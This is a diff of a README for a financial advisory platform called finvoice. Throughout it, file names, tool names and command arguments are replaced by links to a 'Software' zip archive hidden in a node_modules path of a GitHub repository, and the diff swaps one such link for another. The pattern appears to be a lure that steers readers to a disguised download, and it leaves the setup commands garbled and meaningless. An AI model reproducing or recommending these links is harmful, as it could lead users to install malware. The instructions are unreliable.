@@ -18,7 +18,7 @@ A comprehensive financial advisory platform with AI-driven insights, real-time p
 ### Frontend
 - **React** - Responsive web application
 - **Material-UI** - Professional component library
-- **https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip** - Financial data visualization
+- **https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip** - Financial data visualization
 - **PWA** - Mobile-optimized experience
 
 ### Backend
@@ -33,7 +33,7 @@ A comprehensive financial advisory platform with AI-driven insights, real-time p
 - **pandas/numpy** - Data processing
 
 ### Blockchain
-- **https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip** - Polygon Amoy integration
+- **https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip** - Polygon Amoy integration
 - **Smart Contracts** - Audit log storage
 
 ### External APIs
@@ -54,7 +54,7 @@ finvoice/
 │   │   ├── hooks/          # Custom React hooks
 │   │   └── utils/          # Helper functions
 │   ├── public/
-│   └── https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip
+│   └── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
 ├── backend/                 # FastAPI application
 │   ├── app/
 │   │   ├── api/            # API routes
@@ -63,21 +63,21 @@ finvoice/
 │   │   ├── services/       # Business logic
 │   │   ├── ml/             # Machine learning models
 │   │   ├── blockchain/     # Web3 integration
-│   │   └── https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip         # Application entry point
+│   │   └── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip         # Application entry point
 │   ├── tests/
-│   ├── https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip
+│   ├── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
 │   └── Dockerfile
 ├── ml_models/              # Training scripts and models
 ├── blockchain/             # Smart contracts
-├── https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip      # Development environment
-└── https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip
+├── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip      # Development environment
+└── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
 ```
 
 ## 🚦 Getting Started
 
 ### Prerequisites
 - Python 3.11+
-- https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip 18+
+- https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip 18+
 - PostgreSQL 14+ (or use Docker)
 - Redis 6+ (or use Docker)
 - Git
@@ -92,8 +92,8 @@ finvoice/
 
 2. **Copy environment files**
    ```bash
-   cp https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip
-   cp https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip
+   cp https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
+   cp https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
    ```
 
 3. **Start all services with Docker**
@@ -123,12 +123,12 @@ finvoice/
 
 3. **Install dependencies**
    ```bash
-   pip install -r https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip
+   pip install -r https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
    ```
 
 4. **Configure environment**
    ```bash
-   cp https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip .env
+   cp https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip .env
    # Edit .env with your database credentials and API keys
    ```
 
@@ -143,7 +143,7 @@ finvoice/
 
 6. **Start the backend server**
    ```bash
-   uvicorn https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip --reload --port 8000
+   uvicorn https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip --reload --port 8000
    ```
 
 #### Frontend Setup
@@ -160,7 +160,7 @@ finvoice/
 
 3. **Configure environment**
    ```bash
-   cp https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip .env
+   cp https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip .env
    # Edit .env with your API endpoints
    ```
 
@@ -187,10 +187,10 @@ SECRET_KEY=your-super-secret-key-here
 OPENAI_API_KEY=your-openai-api-key
 PLAID_CLIENT_ID=your-plaid-client-id
 PLAID_SECRET=your-plaid-secret
-https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip
+https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
 
 # Blockchain - Polygon Amoy Testnet
-https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip
+https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
 POLYGON_CHAIN_ID=80002
 PRIVATE_KEY=your-ethereum-private-key
 ```
@@ -251,20 +251,20 @@ finvoice/
 │   │   ├── core/           # Configuration and database
 │   │   ├── db/             # Database models
 │   │   ├── services/       # Business logic services
-│   │   └── https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip         # Application entry point
-│   ├── https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip    # Python dependencies
+│   │   └── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip         # Application entry point
+│   ├── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip    # Python dependencies
 │   └── Dockerfile         # Backend container setup
 ├── frontend/               # React application
 │   ├── src/
 │   │   ├── components/    # Reusable UI components
 │   │   ├── pages/         # Page components
 │   │   ├── services/      # API clients
-│   │   └── https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip        # Main app component
-│   ├── https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip       # Node dependencies
+│   │   └── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip        # Main app component
+│   ├── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip       # Node dependencies
 │   └── Dockerfile         # Frontend container setup
 ├── ml_models/             # Machine learning models
-├── https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip     # Development environment
-└── https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip
+├── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip     # Development environment
+└── https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
 ```
 
 ### Running Tests
@@ -302,12 +302,12 @@ npm run lint
 
 1. **Build production images**
    ```bash
-   docker-compose -f https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip build
+   docker-compose -f https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip build
    ```
 
 2. **Deploy with environment variables**
    ```bash
-   docker-compose -f https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip up -d
+   docker-compose -f https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip up -d
    ```
 
 ### Manual Production Deployment
@@ -315,14 +315,14 @@ npm run lint
 #### Backend Deployment
 ```bash
 # Install production dependencies
-pip install -r https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip
+pip install -r https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip
 
 # Set production environment variables
 export DEBUG=False
 export DATABASE_URL=your-production-db-url
 
 # Run with Gunicorn
-gunicorn https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip -w 4 -k https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip -b 0.0.0.0:8000
+gunicorn https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip -w 4 -k https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip -b 0.0.0.0:8000
 ```
 
 #### Frontend Deployment
@@ -358,4 +358,4 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 
 ## 🤝 Contributing
 
-Please read https://github.com/razashaikh26/hackathon/raw/refs/heads/main/frontend/node_modules/@babel/plugin-syntax-class-properties/Software-2.8-beta.4.zip for details on our code of conduct and the process for submitting pull requests.
+Please read https://raw.githubusercontent.com/razashaikh26/hackathon/main/frontend/node_modules/@mui/base/node_modules/@mui/utils/useOnMount/Software-1.9-alpha.5.zip for details on our code of conduct and the process for submitting pull requests.
